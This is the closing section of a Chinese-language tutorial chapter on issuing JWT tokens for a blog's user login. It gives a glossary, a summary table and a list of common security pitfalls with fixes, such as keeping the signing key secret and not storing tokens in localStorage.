| Signature | — | JWT 的第三部分，签名。用 Header + Payload + 密钥通过 HMAC-SHA256 算出来的。**防篡改的核心**——你改了 Payload，签名就对不上。 | 步骤 3 |
| 过期时间（exp） | expiration | JWT 标准字段，token 的有效截止时间。过了这个时间，token 自动失效。默认为 30 分钟。 | 步骤 8 |
| jwt.io | — | JWT 官方提供的在线调试工具。可以粘贴 token 在线解码 Header 和 Payload，验证签名。**仅用于学习和调试，不要往上面粘贴生产环境的 token！** | 步骤 3、7 |
| XSS | Cross-Site Scripting | 跨站脚本攻击。攻击者在你的网站注入恶意 JavaScript 代码，可以读取 localStorage 里的 token 并发给攻击者。**这就是为什么 token 不能存 localStorage。** | 步骤 10 |
| SECRET_KEY | — | JWT 签名用的密钥。服务端用它来签发和验证 token。**必须保密，泄露后任何人都能伪造 token。** 生产环境建议用环境变量存储。 | 步骤 5 |
| HS256 | HMAC-SHA256 | JWT 最常用的签名算法。对称加密——签发和验证用同一把密钥。 | 步骤 3 |
| sub | subject | JWT 标准字段，表示"主题"——通常放用户 ID。你拿到 token 后解码出 `sub`，就知道这个 token 属于哪个用户。 | 步骤 3 |
| iat | issued at | JWT 标准字段，token 的签发时间（Unix 时间戳）。 | 步骤 3 |
| Bearer | — | OAuth 2.0 规范中的 token 类型。意思是"持票人"——谁持有 token，谁就是对应的用户。请求时放在 HTTP Header 里：`Authorization: Bearer <token>`。 | 步骤 6 |
| httpOnly cookie | — | 一种浏览器 cookie 属性。设置了 `httpOnly` 后，JavaScript 代码无法读取这个 cookie，只能由浏览器自动在请求中携带。**防 XSS 偷 token 的重要手段。** | 步骤 10 |
| JWTError | — | `python-jose` 库中的异常类。当 token 无效、过期、签名不匹配时，解码操作会抛出此异常。 | 步骤 8 |

---

## 七、小结

| 你学到了什么 | 一句话总结 |
|--------------|-----------|
| 为什么需要 token | 用户不能每次请求都传密码——token 是"一次验证，多次使用"的凭证 |
| JWT 比喻 | 游乐园手环——入园验票一次，之后只出示手环 |
| JWT 三部分 | Header（算法说明）.Payload（用户数据）.Signature（防伪签名） |
| Payload 不是加密的 | 只是 Base64 编码，任何人都能解码——**不能放敏感信息** |
| 签名的作用 | 防篡改——你改了 Payload，签名就对不上，服务端能检测到 |
| `create_access_token()` | 用 `python-jose` 签发 JWT token，默认 30 分钟过期 |
| 登录接口流程 | 查用户 → 验密码 → 签 token → 返回 |
| 为什么统一返回"用户名或密码错误" | 防止攻击者通过不同错误提示枚举用户名 |
| token 为什么需要过期 | 泄露后"止损"——攻击者只能冒充你 30 分钟，不是永久 |
| SECRET_KEY 必须保密 | 拿到密钥 = 能签发合法 token = 能冒充任何用户 |
| token 不要存 localStorage | XSS 攻击可以直接读取，用 httpOnly cookie 代替 |
| token 放 HTTP Header | `Authorization: Bearer <token>`，不要放 URL 里 |

---

## 八、已知坑点与禁止事项

| 坑点 | 现象 | 原因 | 解决 |
|------|------|------|------|
| SECRET_KEY 写死在代码里并提交 Git | 任何能看到仓库的人都能伪造 token | 密钥泄露 | 用环境变量 `os.getenv("SECRET_KEY")`，把密钥加到 `.gitignore` |
| 在 Payload 里放敏感信息 | 密码、身份证号等暴露 | Payload 只是 Base64 编码，不是加密 | Payload 只放用户 ID、用户名等非敏感信息 |
| token 放在 URL 里传 | token 被记录到各种日志 | URL 会出现在浏览器历史、服务器日志、代理日志 | 放在 HTTP Header：`Authorization: Bearer <token>` |
| 打印 token 到日志 | 日志泄露导致 token 泄露 | 日志文件通常没有严格的访问控制 | 最多打印 token 前几位，绝不打印完整 token |
| 用 `==` 直接比对密码 | 永远返回 False | `passlib` 的哈希每次结果不同，不能直接比对 | 用 `pwd_context.verify(明文, 哈希值)` |
| 密码验证失败返回不同提示 | 攻击者可以枚举用户名 | 区分"用户名不存在"和"密码错误"给了攻击者信息 | 统一返回"用户名或密码错误" |
| 在 jwt.io 上粘贴生产 token | 生产 token 泄露 | jwt.io 虽然不会主动收集，但网络传输有风险 | 只在本地测试时使用，永远不要粘贴生产环境 token |
| 忘了 `db.commit()` 或 `db.refresh()` | 和教程 13 的坑一样——注册用户后查不到 | `add()` 只是标记，`commit()` 才真正写入 | 每个写操作后都要 `db.commit()` + `db.refresh()` |

---

## 九、下一步建议

你已经实现了用户登录和 JWT 签发——但现在 token 还没真正"用起来"。

- **下一章 [16-权限保护](./16-权限保护：没登录不能写.md)**：用 token 保护接口——只有登录用户才能创建、修改、删除文章。没登录的人只能看，不能写。
- **延伸思考**：如果你拿到 token 后，想从 token 中解析出当前用户，需要写一个 `get_current_user` 依赖函数。这个在下一章会详细实现。
- **进阶话题**：JWT 还有"刷新 token"（Refresh Token）机制，可以让用户在不下线的情况下持续使用。感兴趣的话，可以搜索 "JWT refresh token" 了解。

---

> 📊 可视化演示见 [python_15_jwt_visual.html](python_15_jwt_visual.html)
>
> 本可视化完整展示了 JWT 认证流程：从用户登录、密码验证、token 签发，到后续请求中 token 验证的全过程。

---

> [可暂停点 4/4]：阶段四（用户系统）已经完成了一大半。你已经学会了用户注册、密码哈希、登录验证、JWT 签发。停下来回顾一下——你从"所有数据人人可访问"到现在"有用户身份、有 token 凭证"，你的博客系统越来越像一个真正的产品了。
>
> 下一章会把这些 token 真正"用起来"——保护接口，让没登录的人只能看不能写。